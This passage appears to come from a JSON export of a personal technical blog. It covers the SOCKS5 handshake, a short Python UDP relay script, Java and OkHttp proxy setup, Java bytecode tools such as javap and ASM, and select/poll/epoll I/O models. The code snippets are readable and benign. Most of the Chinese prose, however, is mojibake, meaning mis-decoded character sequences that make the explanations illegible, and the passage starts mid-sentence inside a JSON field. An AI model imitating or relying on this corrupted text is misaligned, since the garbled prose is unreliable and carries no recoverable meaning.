¹æ®æœåŠ¡å™¨ç«¯é€‰å®šçš„æ–¹æ³•è¿›è¡Œè®¤è¯ï¼Œå¦‚æœé€‰å®šçš„æ–¹æ³•æ˜¯02,åˆ™æ ¹æ®RFC 1929å®šä¹‰çš„æ–¹æ³•è¿›è¡Œè®¤è¯ã€‚RFC 1929å®šä¹‰çš„å¯†ç æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œå®‰å…¨æ€§è¾ƒå·®ã€‚ è¯·æ±‚ä¸€æ—¦æŒ‡å®šè®¤è¯æ–¹æ³•çš„åå•†è¿‡ç¨‹å®Œæˆ, å®¢æˆ·ç«¯å‘é€è¯¦ç»†çš„è¯·æ±‚ä¿¡æ¯ã€‚ç»å¸¸ä½¿ç”¨ SOCKS ä»£ç†æœåŠ¡å™¨çš„åŒå¿—ä»¬ä¼šå‘ç°ä¸€ç§ç°è±¡ï¼Œå³ä½¿ SOCKS ä»£ç†æœåŠ¡å™¨è®¾ç½®æ­£ç¡®ï¼ŒæŸäº›ç½‘ç«™ä»ç„¶æ— æ³•è®¿é—®,ä¸€èˆ¬æ¥è¯´å°±æ˜¯DNSæ±¡æŸ“é€ æˆçš„ã€‚SOCKS 5æ˜¯é€šè¿‡å°†åŸŸåç›´æ¥æäº¤ç»™ SOCKS æœåŠ¡å™¨æ¥è¿›è¡Œè¿œç«¯ DNS è§£æçš„ï¼Œå³ Address Type 0x03ã€‚ DNS æœåŠ¡æ˜¯ Internet çš„åŸºç¡€æœåŠ¡ï¼Œè¦æ±‚ DNS è§£æåº”å½“å°½é‡åœ°å¿«ï¼Œæ‰€ä»¥æµè§ˆå™¨é»˜è®¤ä¸ä¼šä½¿ç”¨è¿œç«¯ DNS è§£æã€‚åœ¨Chromeçš„SwitchySharp å’ŒFirefoxé‡Œé¢çš„FoxyProxyå¯ä»¥æ”¯æŒè¿œç«¯DNSè§£æï¼Œå¯ä»¥é¿å¼€DNSæ±¡æŸ“é—®é¢˜ã€‚ sock5åè®®å…¶å®åœ¨å‘½ä»¤è¡Œé‡Œå°±èƒ½ç”¨ä¸Š: curl â€“sock5 127.0.0.1:1080 http://www.google.com æ•´ä½“çš„æµç¨‹: å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€åè®®ç‰ˆæœ¬å·åŠæ”¯æŒè®¤è¯æ–¹å¼(åœ¨proxy serverè¿™è¾¹ä¼šæ”¶åˆ°å‡ ä¸ªå­—èŠ‚çš„bindè¯·æ±‚05 01 00 xxxx)æœåŠ¡å™¨å›åº”ç‰ˆæœ¬å·åŠé€‰å®šè®¤è¯æ–¹å¼å®¢æˆ·ç«¯å‘é€Connectè¯·æ±‚æœåŠ¡å™¨å¯¹Connectçš„å“åº”å®¢æˆ·ç«¯å‘é€è¢«ä»£ç†çš„æ•°æ®æœåŠ¡å™¨å“åº”è¢«ä»£ç†çš„æ•°æ® æ‰€ä»¥æœ€ç»ˆå®ç°çš„æ•ˆæœæ˜¯å®ç°ä½¿ç”¨ä»£ç†è®¿é—®çŸ¥ä¹å› ä¸ºèµ°çš„æ˜¯æ˜æ–‡ï¼Œè¿™æ ·çš„ä»£ç†åªæ˜¯å…·æœ‰å­¦ä¹ çš„æ€§è´¨ã€‚æ›´å¤šçš„éœ€è¦å‚è€ƒshadowsocksçš„å®ç°(tcp proxy,æ”¯æŒudp)ã€‚å¦å¤–ï¼Œä¸šå†…æ¯”è¾ƒå‡ºåçš„tcp proxyæœ‰nginxï¼Œenovyä»¥åŠgolang tcp proxyçš„å®ç°ã€‚ udp proxyçš„å®ç°éå¸¸çŸ­çš„ä¸€ä¸ªè„šæœ¬ #!/usr/bin/env python # Super simple script that listens to a local UDP port and relays all packets to an arbitrary remote host. # Packets that the host sends back will also be relayed to the local UDP client. # Works with Python 2 and 3 import sys, socket def fail(reason): sys.stderr.write(reason + &#39;\\n&#39;) sys.exit(1) if len(sys.argv) != 2 or len(sys.argv[1].split(&#39;:&#39;)) != 3: fail(&#39;Usage: udp-relay.py localPort:remoteHost:remotePort&#39;) localPort, remoteHost, remotePort = sys.argv[1].split(&#39;:&#39;) try: localPort = int(localPort) except: fail(&#39;Invalid port number: &#39; + str(localPort)) try: remotePort = int(remotePort) except: fail(&#39;Invalid port number: &#39; + str(remotePort)) try: s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.bind((&#39;&#39;, localPort)) except: fail(&#39;Failed to bind on port &#39; + str(localPort)) knownClient = None knownServer = (remoteHost, remotePort) sys.stderr.write(&#39;All set.\\n&#39;) while True: data, addr = s.recvfrom(32768) if knownClient is None: knownClient = addr if addr == knownClient: s.sendto(data, knownServer) else: s.sendto(data, knownClient) raw socket(åŸå§‹å¥—æ¥å­—)ä¼˜åŒ–serverç«¯ç›‘å¬åœ¨ä¸€ä¸ªç«¯å£ï¼Œclientç«¯å‘é€æ•°æ®çš„ç«¯å£å˜æ¥å˜å»ã€‚æ•°æ®é‡å¤§çš„æ—¶å€™å•çº¿ç¨‹é˜»å¡å¼çš„serverè¿˜æ˜¯ä¼šæœ‰æ€§èƒ½é—®é¢˜ã€‚pythonä¸­å¯ä»¥ä½¿ç”¨selectorsæ¨¡å—ï¼Œåœ¨serverç«¯ï¼Œæ¯æ¬¡socket.accept()ä¹‹åï¼Œå°±registerä¸€ä¸ªfileno for read and write eventã€‚å‚è€ƒudpRelayServeræ¯æ¬¡selector.select(è¿™ä¸ªå‡½æ•°æ˜¯blockingçš„)ï¼Œä»ç«¯å£ä¸Šæ¥çœ‹ï¼Œclientè¿™è¾¹å¯ä»¥å¼€å¤šä¸ªportå‘æ•°æ®ç»™proxyï¼Œ proxyè¿™è¾¹åªç”¨ä¸€ä¸ªportæ¥å—ï¼Œå¯¹å¤–éƒ¨ç½‘ç»œä¸–ç•Œå¤šä¸ªipï¼Œå¼€å¤šä¸ªportã€‚æ‰€ä»¥proxyå†…éƒ¨åº”è¯¥ç»´æŠ¤ä¸€ä¸ªexternal port &lt;======&gt; client port çš„æ˜ å°„ã€‚å¼€å§‹selectä¹‹åï¼Œé¦–å…ˆæ˜¯selectå‡ºæ¥ä¸€ä¸ªreadableçš„client socket(port) ï¼Œè¯»å–ä¿¡æ¯ï¼Œå­˜å‚¨åˆ°ä¸€ä¸ª{ clientport , [clientmessageOutList] } çš„å­—å…¸é‡Œã€‚ ç„¶åæ ¹æ®clientmessageä¸­æš—ç¤ºçš„remote ipå’Œportå»registerä¸€ä¸ªsocketï¼Œ registerçš„æ—¶å€™æ˜¯å¯ä»¥å¸¦ä¸Šä¸€äº›è‡ªå®šä¹‰æ•°æ®çš„ï¼Œè¿™é‡Œæ”¾ä¸Šclientport. å½“è¿™ä¸ªregisterçš„å›è°ƒå¼€å§‹æ—¶ï¼Œå¦‚æœæ˜¯å¯å†™ï¼Œé‚£ä¹ˆæŠŠåˆšæ‰å­—å…¸é‡Œçš„ä¿¡æ¯æ‹¿å‡ºæ¥ï¼Œdelæ‰ã€‚ å¦‚æœæ˜¯å¯è¯»ï¼Œé‚£ä¹ˆè¯´æ˜å‘å‡ºå»çš„ä¸œè¥¿æœ‰å›ä¿¡äº†ï¼Œè¿™æ—¶å€™å»è‡ªå®šä¹‰æ•°æ®é‡Œé¢çš„portï¼Œå­˜åˆ°ä¸€ä¸ª{clientport, [messageToBeDelivedBackList] } çš„å­—å…¸é‡Œã€‚åœ¨selectæœ¬åœ°portçš„æ—¶å€™ï¼Œå¦‚æœæ‰«åˆ°ä¸€ä¸ªwritabelçš„client socket portï¼Œå°±æ ¹æ®è¿™ä¸ªport num å»å­—å…¸é‡Œè·å–messageToBeDelivedBackï¼Œå‘é€å›å»ã€‚åˆ°æ­¤ç»“æŸä¸€ä¸ªæµç¨‹ã€‚ä»»ä½•æ—¶é—´æ®µï¼Œproxyè¿™è¾¹ç»´æŒäº†ä¸¤ä¸ªå­—å…¸ï¼Œä¸€å¤´æ˜¯é¢å‘clientçš„ï¼Œport =&gt; [è¦å‘é€çš„msg1,è¦å‘é€çš„msg2,â€¦] , ä¸€å¤´æ˜¯é¢å‘å¤šä¸ªremote ip portç»„åˆçš„çš„ã€‚å­˜å‚¨äº† clientport =&gt; [è¦å›å¤ç»™clientçš„msg1 ,è¦å›å¤ç»™clientçš„msg2] .é¢å‘clientåªéœ€è¦åšä¸€ä¸ªselectoræ“ä½œï¼Œé¢å‘outsideéœ€è¦åšå¤šä¸ªselectoræ“ä½œï¼ˆä¸€ä¸ªå¤–éƒ¨ç½‘ç«™ä¸€èˆ¬ä¸€ä¸ªå°±å¤Ÿäº†ï¼‰ã€‚ä¸åœçš„è½®è¯¢ã€‚ä½†å®é™…ä¸Šåªéœ€è¦ä¸€ä¸ªselectorå°±è¡Œäº†ã€‚ try: while True: events = sel.select(timeout=1) if events: for key, mask in events: service_connection(key, mask) ## key.fileobjæ˜¯socket, key,dataæ˜¯registerçš„æ—¶å€™è‡ªå®šä¹‰çš„æ•°æ® ssçš„tcpåŒ…ç»“æ„ä¸»åŠ¨æ¢æµ‹æ–¹æ³•åè®®ä¸ç»“æ„ javaé‡Œé¢æœ‰ä¸€ä¸ªproxyç±»ï¼Œäº‹å®ä¸Šjdkæœ¬èº«å¯¹äºsockä»£ç†æ˜¯æ”¯æŒçš„åªä¸è¿‡javaè‡ªå¸¦çš„proxyç±»ä¼šå…¨å±€ä»£ç†ï¼Œé‰´æƒæ˜¯å¯¹æ•´ä¸ªjvmç”Ÿæ•ˆçš„ã€‚ Authenticator.setDefault(new Authenticator(){ protected PasswordAuthentication getPasswordAuthentication(){ PasswordAuthentication p=new PasswordAuthentication(&quot;xxx&quot;, &quot;xxx&quot;.toCharArray()); return p; } }); Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(&quot;xxx.xx.xxx.xxx&quot;, xxx)); Socket sock = new Socket(proxy); sock.connect(new InetSocketAddress(server,xx)); The side effect of the SOCKS support in JDK is that your whole JVM will go through the same SOCKS proxy.The Authenticator affects all authentication in your JVM (HTTP auth, Proxy Auth). æ‰€ä»¥ç­‰äºè¯´æ¥ç®¡äº†æ•´ä¸ªjvmçš„è¯·æ±‚okHttpæœ‰ä¸€ä¸ªæ¯”è¾ƒå‹å¥½çš„æ–¹å¼ Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(&quot;127.0.0.1&quot;, 1086)); Authenticator proxyAuthenticator = new Authenticator() { @Override public Request authenticate(Route route, Response response) throws IOException { String credential = Credentials.basic(username, password); return response.request().newBuilder() .header(&quot;Proxy-Authorization&quot;, credential) .build(); } }; OkHttpClient client = new OkHttpClient().newBuilder(). connectTimeout(120, TimeUnit.SECONDS).readTimeout(120, TimeUnit.SECONDS).proxy(proxy) .proxyAuthenticator(proxyAuthenticator) .build() æ„Ÿè§‰ä¸Šåƒæ˜¯é€šè¿‡å°†è´¦æˆ·å¯†ç æ”¾åˆ°headeré‡Œé¢å»åšçš„ SO_REUSEPORTé€‰é¡¹æ”¯æŒå¤šä¸ªè¿›ç¨‹åŒæ—¶ç›‘å¬ä¸€ä¸ªportï¼Œåœ¨å†…æ ¸å±‚é¢å®ç°æµé‡çš„è´Ÿè½½å‡è¡¡ã€‚ï¼ˆè¿™æ˜¯socketçš„ä¸€ä¸ªé€‰é¡¹ï¼Œsince linux 3.9ï¼‰ï¼Œ javaä»jdk9æ‰æ·»åŠ äº†æ”¯æŒï¼Œä¹Ÿæœ‰hackçš„æ–¹å¼é€šè¿‡åå°„è°ƒç”¨nativeæ–¹æ³•å»è®¾ç½®è¿™ä¸ªå€¼çš„ã€‚ ä¾‹å¦‚nginxçš„masterè¿›ç¨‹å’Œworkerè¿›ç¨‹ï¼Œä¾‹å¦‚å¤šä¸ªss-rediråŒæ—¶ç›‘å¬ä¸€ä¸ªç«¯å£ã€‚ å‚è€ƒpythonå°å·¥å…·ï¼štcp proxyå’Œtcp hubWriting a simple SOCKS server in PythonSOCKS 5åè®®ç®€æshadowsocks-nettylightsocks-python","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"bytecodeåŸºæœ¬è§£è¯»","date":"2018-12-12T11:11:02.000Z","path":"2018/12/12/2018-12-12-sinking-your-teeth-into-ByteCode/","text":"pythonä¸­å¯ä»¥ä½¿ç”¨diss module è½»æ˜“çš„æŸ¥çœ‹byte codeã€‚é‚£ä¹ˆåœ¨javaä¸­å‘¢ interpreting the talk fromSinking Your Teeth Into Bytecode java æœ‰ä¸€ä¸ªå…³é”®å­—å«åšgotoï¼Œåœ¨javaä»£ç ä¸­å¥½åƒä¸èƒ½ç”¨ï¼Œä½†æ˜¯å…¶å®åœ¨ç”Ÿæˆçš„bytecodeé‡Œé¢æœ‰gotoå…³é”®å­—(cè¯­è¨€ä¹Ÿæœ‰) javap -c someclassjmapç­‰jdkçš„binæ–‡ä»¶ä¸‹é¢çš„åŠŸèƒ½ jpsjstack 12345 &gt; thread.txt JDK ä¸­çš„ jpsï¼Œjstatï¼Œjstackï¼Œjmap å¾ˆæœ‰ç”¨ ä»åç¼–è¯‘è§’åº¦æ¥çœ‹stringå¸¸é‡æ± çš„é—®é¢˜ invoke dynamicæ˜¯ç¬¬äº”ç§ï¼Œjdk7åŠ å…¥çš„ å‚è€ƒJVM bytecode engineering 101JVM Bytecode for Dummies (and the Rest of Us Too)å®ä¾‹åˆ†æJAVA CLASSçš„æ–‡ä»¶ç»“æ„ä»å­—èŠ‚ç å±‚é¢çœ‹â€œHelloWorldâ€ 39. javapä¸€èˆ¬ç”¨æ¥åç¼–è¯‘classæ–‡ä»¶ javap Animal.classjavap -c Animal.class //ç›´æ¥çœ‹å­—èŠ‚ç javap -help å¯ä»¥çœ‹æ›´å¤šå‘½ä»¤è¡Œå‚æ•°çš„å«ä¹‰ ä¸è¿‡ä¸€èˆ¬ä¸è¿™ä¹ˆç›´æ¥çœ‹å­—èŠ‚ç ï¼Œå› ä¸ºéƒ½æ˜¯æœ‰è§„åˆ™çš„ï¼Œå·²ç»æœ‰äººåšå‡ºäº†guiçš„å·¥å…·ï¼Œæ¯”å¦‚jad ./jad -sjava Animal.class public enum Animal { DOG,CAT } // é€šè¿‡jadç¿»è¯‘è¿‡åçš„å­—èŠ‚ç å…¶å®é•¿è¿™æ · public final class Animal extends Enum { public static Animal[] values() { return (Animal[])$VALUES.clone(); } public static Animal valueOf(String s) { return (Animal)Enum.valueOf(Animal, s); } private Animal(String s, int i) { super(s, i); } public static final Animal DOG; public static final Animal CAT; private static final Animal $VALUES[]; static { DOG = new Animal(&quot;DOG&quot;, 0); CAT = new Animal(&quot;CAT&quot;, 1); $VALUES = (new Animal[] { DOG, CAT }); } } asmä½¿ç”¨ASM æ˜¯ä¸€ä¸ª Java å­—èŠ‚ç æ“æ§æ¡†æ¶ã€‚å®ƒèƒ½è¢«ç”¨æ¥åŠ¨æ€ç”Ÿæˆç±»æˆ–è€…å¢å¼ºæ—¢æœ‰ç±»çš„åŠŸèƒ½ã€‚ASM å¯ä»¥ç›´æ¥äº§ç”ŸäºŒè¿›åˆ¶ class æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥åœ¨ç±»è¢«åŠ è½½å…¥ Java è™šæ‹Ÿæœºä¹‹å‰åŠ¨æ€æ”¹å˜ç±»è¡Œä¸ºã€‚Java class è¢«å­˜å‚¨åœ¨ä¸¥æ ¼æ ¼å¼å®šä¹‰çš„ .class æ–‡ä»¶é‡Œï¼Œè¿™äº›ç±»æ–‡ä»¶æ‹¥æœ‰è¶³å¤Ÿçš„å…ƒæ•°æ®æ¥è§£æç±»ä¸­çš„æ‰€æœ‰å…ƒç´ ï¼šç±»åç§°ã€æ–¹æ³•ã€å±æ€§ä»¥åŠ Java å­—èŠ‚ç ï¼ˆæŒ‡ä»¤ï¼‰ã€‚ASM ä»ç±»æ–‡ä»¶ä¸­è¯»å…¥ä¿¡æ¯åï¼Œèƒ½å¤Ÿæ”¹å˜ç±»è¡Œä¸ºï¼Œåˆ†æç±»ä¿¡æ¯ï¼Œç”šè‡³èƒ½å¤Ÿæ ¹æ®ç”¨æˆ·è¦æ±‚ç”Ÿæˆæ–°ç±»ã€‚åˆ›å»ºå‡ºä¸€ä¸ªclassfastjsonåœ¨è·å–java beançš„å±æ€§å€¼çš„æ—¶å€™ï¼Œä¸ºäº†é¿å…åå°„ï¼Œæ‰ä½¿ç”¨çš„asmã€‚fastjsonä¸­çš„asmæ˜¯ç…§ç€ org.objectwebçš„asmæ”¹é€ çš„ã€‚fastjsonä¸­è¿˜æœ‰ä¸€æ®µThreadLocalCacheï¼Œç¼“å­˜äº†charæ•°ç»„ï¼Œæ‰€ä»¥å¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šé¿å…å¤§é‡çš„å†…å­˜åˆ†é…classæ–‡ä»¶ç»“æ„ä»¥åŠä½¿ç”¨asmæ•™ç¨‹ å‚è€ƒç¾å›¢æŠ€æœ¯åšå®¢å…³äºjava byte code çš„ä»‹ç»jav-class-viewer ä¸€ä¸ªguiå·¥å…·ï¼Œèƒ½å¤Ÿéå¸¸ç›´è§‚åœ°å±•ç¤ºclassæ–‡ä»¶çš„ç»“æ„","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"selectã€pollã€epollå­¦ä¹ ç¬”è®°","date":"2018-12-06T08:38:54.000Z","path":"2018/12/06/2018-12-06-select-poll-epoll/","text":"selectï¼Œpollï¼Œepolléƒ½æ˜¯IOå¤šè·¯å¤ç”¨çš„æœºåˆ¶ã€‚I/Oå¤šè·¯å¤ç”¨å°±é€šè¿‡ä¸€ç§æœºåˆ¶ï¼Œå¯ä»¥ç›‘è§†å¤šä¸ªæè¿°ç¬¦ï¼Œä¸€æ—¦æŸä¸ªæè¿°ç¬¦å°±ç»ªï¼ˆä¸€èˆ¬æ˜¯è¯»å°±ç»ªæˆ–è€…å†™å°±ç»ªï¼‰ï¼Œèƒ½å¤Ÿé€šçŸ¥ç¨‹åºè¿›è¡Œç›¸åº”çš„è¯»å†™æ“ä½œã€‚ä½†selectï¼Œpollï¼Œepollæœ¬è´¨ä¸Šéƒ½æ˜¯åŒæ­¥I/Oï¼Œå› ä¸ºä»–ä»¬éƒ½éœ€è¦åœ¨è¯»å†™äº‹ä»¶å°±ç»ªåè‡ªå·±è´Ÿè´£è¿›è¡Œè¯»å†™ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè¯»å†™è¿‡ç¨‹æ˜¯é˜»å¡çš„ï¼Œè€Œå¼‚æ­¥I/Oåˆ™æ— éœ€è‡ªå·±è´Ÿè´£è¿›è¡Œè¯»å†™ï¼Œå¼‚æ­¥I/Oçš„å®ç°ä¼šè´Ÿè´£æŠŠæ•°æ®ä»å†…æ ¸æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ã€‚ linuxä¸‹æä¾›äº”ç§io modelåŒæ­¥IO(synchronous IO)é˜»å¡IO(bloking IO)éé˜»å¡IO(non-blocking IO)å¤šè·¯å¤ç”¨IO(multiplexing IO)ä¿¡å·é©±åŠ¨å¼IO(signal-driven IO) è¿™ç§ç”¨çš„ä¸å¤šå¼‚æ­¥IO(asynchronous IO)å…·ä½“çš„ä»‹ç»çœ‹è¿™ç¯‡æ–‡ç« :äº”ç§ioæ¨¡å¼çš„ä»‹ç» select(readfds, writefds, errorfds) ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„å†…å­˜copyçš„å¼€é”€ macä¸Šå«åšKqueueepollæˆ–è€…Kqueueçš„åŸç†æ˜¯ä»€ä¹ˆ åœ¨çœ‹socket programming in pythonè¿™ç¯‡æ–‡ç« æ—¶å‘ç°æœ‰selectorè¿™æ ·çš„æ“ä½œã€‚å…¶å®å’Œcè¯­è¨€çš„åšæ³•å¾ˆç›¸ä¼¼ã€‚ Windows IOCPä¸Linuxçš„epollæœºåˆ¶å¯¹æ¯”ç³»ç»ŸI/Oæ¨¡å‹ å¯åˆ†ä¸ºä¸‰ç±»ï¼šç¬¬ä¸€ç§ï¼š é˜»å¡å‹(blocking model)ï¼Œåº”ç”¨è¿›ç¨‹å‘èµ·connectè¯·æ±‚ï¼Œè¿›å…¥ç³»ç»Ÿå†…æ ¸æ–¹æ³•è°ƒç”¨ã€‚å†…æ ¸è´Ÿè´£å‘é€SYN,ç­‰å¾…ACK,ç­‰åˆ°ACKã€SYNCåˆ°è¾¾ä»¥åï¼Œå‘é€ACKï¼Œè¿æ¥å®Œæˆï¼Œreturnç”¨æˆ·æ€çš„connectè°ƒç”¨ã€‚ä»¥ä¸Šè¿‡ç¨‹ä¸­ï¼Œåº”ç”¨å±‚ä¸€ç›´é˜»å¡ã€‚ ç¬¬äºŒç§ï¼š éé˜»å¡åŒæ­¥å‹(non-blocking model): â€œwait until any socket is available to read or write from/to buffer, then call non blocking socket function which returns immediately.â€å¯ä»¥é€šè¿‡è®¾ç½®SOCK_NONBLOCKæ ‡è®°åˆ›å»ºéé˜»å¡çš„socket fdï¼Œæˆ–è€…ç”¨fcntlä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚æ¯”æ–¹è¯´cè¯­è¨€åœ¨linuxç¯å¢ƒä¸‹å¯ä»¥è¿™ä¹ˆå†™ã€‚ // client side int socketfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0); // server side - see man page for accept4 under linux int socketfd = accept4( ... , SOCK_NONBLOCK); å¯¹éé˜»å¡fdè°ƒç”¨ç³»ç»Ÿæ¥å£æ—¶ï¼Œä¸éœ€è¦ç­‰å¾…äº‹ä»¶å‘ç”Ÿè€Œç«‹å³è¿”å›ï¼Œäº‹ä»¶æ²¡æœ‰å‘ç”Ÿï¼Œæ¥å£è¿”å›-1ï¼Œæ­¤æ—¶éœ€è¦é€šè¿‡errnoçš„å€¼æ¥åŒºåˆ†æ˜¯å¦å‡ºé”™ï¼Œæœ‰è¿‡ç½‘ç»œç¼–ç¨‹çš„ç»éªŒçš„åº”è¯¥éƒ½äº†è§£è¿™ç‚¹ã€‚ä¸åŒçš„æ¥å£ï¼Œç«‹å³è¿”å›æ—¶çš„errnoå€¼ä¸å°½ç›¸åŒï¼Œå¦‚ï¼Œrecvã€sendã€accept errnoé€šå¸¸è¢«è®¾ç½®ä¸ºEAGIN æˆ–è€…EWOULDBLOCKï¼Œconnect åˆ™ä¸ºEINPRO- GRESS ã€‚å°±æ˜¯è¯´ï¼Œå®¢æˆ·ç«¯ç¨‹åºä¼šä¸åœåœ°å»å°è¯•è¯»å–æ•°æ®ï¼Œä½†æ˜¯ä¸ä¼šé˜»å¡åœ¨é‚£ä¸ªè¯»æ–¹æ³•é‡Œï¼Œå¦‚æœè¯»çš„æ—¶å€™ï¼Œæ²¡æœ‰è¯»åˆ°å†…å®¹ï¼Œä¹Ÿä¼šç«‹å³è¿”å›ã€‚è¿™å°±å…è®¸æˆ‘ä»¬åœ¨å®¢æˆ·ç«¯é‡Œï¼Œè¯»åˆ°ä¸æ•°æ®çš„æ—¶å€™å¯ä»¥æç‚¹å…¶ä»–çš„äº‹æƒ…äº†ã€‚ ç¬¬ä¸‰ç§ï¼š éé˜»å¡å¼‚æ­¥å‹(asynchronous aka. overlapping model): â€œcall a socket function which returns immediately, then wait for its completion, then access the result data objectâ€IOå¤šè·¯å¤ç”¨ï¼ŒI/Oå¤ç”¨(I/O multiplexing). IOå¤šè·¯å¤ç”¨æ˜¯nioçš„æ ¸å¿ƒå’Œå…³é”®ï¼Œä¹Ÿæ˜¯å®ç°é«˜æ€§èƒ½æœåŠ¡å™¨çš„å…³é”®ã€‚åº”ç”¨è¿›ç¨‹é€šè¿‡è°ƒç”¨epoll_waité˜»å¡ç­‰å¾…å¯è¯»äº‹ä»¶ï¼Œç­‰å¯è¯»äº‹ä»¶è§¦å‘æ—¶ï¼Œç³»ç»Ÿä¼šå›è°ƒæ³¨å†Œçš„å‡½æ•°ã€‚ å¦å¤–è¿˜æœ‰ä¿¡å·ï¼Œasync io IOCPåŸºäºéé˜»å¡å¼‚æ­¥æ¨¡å‹ï¼Œè€ŒepollåŸºäºéé˜»å¡åŒæ­¥æ¨¡å‹ã€‚ å‚è€ƒ NIO ä¸­ Selector æ˜¯å¯¹åº•å±‚æ“ä½œç³»ç»Ÿå®ç°çš„ä¸€ä¸ªæŠ½è±¡ï¼Œç®¡ç†é€šé“çŠ¶æ€å…¶å®éƒ½æ˜¯åº•å±‚ç³»ç»Ÿå®ç°çš„ï¼Œè¿™é‡Œç®€å•ä»‹ç»ä¸‹åœ¨ä¸åŒç³»ç»Ÿä¸‹çš„å®ç°ã€‚ selectï¼šä¸Šä¸–çºª 80 å¹´ä»£å°±å®ç°äº†ï¼Œå®ƒæ”¯æŒæ³¨å†Œ FD_SETSIZE(1024) ä¸ª socketï¼Œåœ¨é‚£ä¸ªå¹´ä»£è‚¯å®šæ˜¯å¤Ÿç”¨çš„ï¼Œä¸è¿‡ç°åœ¨å˜›ï¼Œè‚¯å®šæ˜¯ä¸è¡Œäº†ã€‚ pollï¼š1997 å¹´ï¼Œå‡ºç°äº† poll ä½œä¸º select çš„æ›¿ä»£è€…ï¼Œæœ€å¤§çš„åŒºåˆ«å°±æ˜¯ï¼Œpoll ä¸å†é™åˆ¶ socket æ•°é‡ã€‚ select å’Œ poll éƒ½æœ‰ä¸€ä¸ªå…±åŒçš„é—®é¢˜ï¼Œé‚£å°±æ˜¯å®ƒä»¬éƒ½åªä¼šå‘Šè¯‰ä½ æœ‰å‡ ä¸ªé€šé“å‡†å¤‡å¥½äº†ï¼Œä½†æ˜¯ä¸ä¼šå‘Šè¯‰ä½ å…·ä½“æ˜¯å“ªå‡ ä¸ªé€šé“ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦çŸ¥é“æœ‰é€šé“å‡†å¤‡å¥½ä»¥åï¼Œè‡ªå·±è¿˜æ˜¯éœ€è¦è¿›è¡Œä¸€æ¬¡æ‰«æï¼Œæ˜¾ç„¶è¿™ä¸ªä¸å¤ªå¥½ï¼Œé€šé“å°‘çš„æ—¶å€™è¿˜è¡Œï¼Œä¸€æ—¦é€šé“çš„æ•°é‡æ˜¯å‡ åä¸‡ä¸ªä»¥ä¸Šçš„æ—¶å€™ï¼Œæ‰«æä¸€æ¬¡çš„æ—¶é—´éƒ½å¾ˆå¯è§‚äº†ï¼Œæ—¶é—´å¤æ‚åº¦ O(n)ã€‚æ‰€ä»¥ï¼Œåæ¥æ‰å‚¬ç”Ÿäº†ä»¥ä¸‹å®ç°ã€‚ epollï¼š2002 å¹´éš Linux å†…æ ¸ 2.5.44 å‘å¸ƒï¼Œepoll èƒ½ç›´æ¥è¿”å›å…·ä½“çš„å‡†å¤‡å¥½çš„é€šé“ï¼Œæ—¶é—´å¤æ‚åº¦ O(1)ã€‚ é™¤äº† Linux ä¸­çš„ epollï¼Œ2000 å¹´ FreeBSD å‡ºç°äº† Kqueueï¼Œè¿˜æœ‰å°±æ˜¯ï¼ŒSolaris ä¸­æœ‰ /dev/pollã€‚ å‰é¢è¯´äº†é‚£ä¹ˆå¤šå®ç°ï¼Œä½†æ˜¯æ²¡æœ‰å‡ºç° Windowsï¼ŒWindows å¹³å°çš„éé˜»å¡ IO ä½¿ç”¨ selectï¼Œæˆ‘ä»¬ä¹Ÿä¸å¿…è§‰å¾— Windows å¾ˆè½åï¼Œåœ¨ Windows ä¸­ IOCP æä¾›çš„å¼‚æ­¥ IO æ˜¯æ¯”è¾ƒå¼ºå¤§çš„ã€‚ select,poll,epollçš„å½’çº³æ€»ç»“åŒºåˆ†select,poll,epollçš„å½’çº³æ€»ç»“åŒºåˆ† selectæœ‰1024çš„ä¸Šé™pollæœ¬è´¨ä¸Šå’Œselectæ²¡æœ‰åŒºåˆ«ï¼Œæ²¡æœ‰ä¸Šé™æ˜¯å› ä¸ºä½¿ç”¨äº†é“¾è¡¨å­˜å‚¨ï¼Œå¤§é‡çš„fdçš„æ•°ç»„è¢«æ•´ä½“å¤åˆ¶äºç”¨æˆ·æ€å’Œå†…æ ¸åœ°å€ç©ºé—´ä¹‹é—´epollä½¿ç”¨mmapè§£å†³äº†å¤åˆ¶çš„å¼€é”€ å‚è€ƒIOæ¨¡å‹è¯¦è§£ blocking io, nonblocking io, io multiplexing, asynchronous io,etc Windows IOCP vs Linux EPOLL Performance ComparisonIOå¤šè·¯å¤ç”¨ä¹‹epollæ€»ç»“Linux IOæ¨¡å¼åŠ selectã€pollã€epollè¯¦è§£epollæµ…æä»¥åŠnioä¸­çš„Selectorå¤§è¯ Selectã€Pollã€EpollThere is no Windows equivalent to epoll/kqueue , but there is Overlapped IO ç®€å•è¯´å°±æ˜¯windowsåœ¨è¿™æ–¹é¢è®¾è®¡çš„æ›´ä¼˜ç§€ï¼Œåªæ˜¯å¼€å‘è€…å¹¶æœªä¹°è´¦Coroutines, Async/Await, Asyncio and the Pulsar Library node, go goroutine, nginx, gui libraries ,java nioç­‰éƒ½ä»¥å„ç§å½¢å¼é‡‡ç”¨äº†æˆ–å®ç°äº†è‡ªå·±çš„event loop IO å¤šè·¯å¤ç”¨ â€” SELECT å’Œ POLL linux kernel aioæ˜¯å¦ä¸€ä¸ªå†…æ ¸æä¾›çš„å¼‚æ­¥æ¡†æ¶ï¼Œä½†æ˜¯ä¸å¦‚epollæˆç†Ÿå¦‚ä½•ä½¿ç”¨ epoll? ä¸€ä¸ª C è¯­è¨€å®ä¾‹ 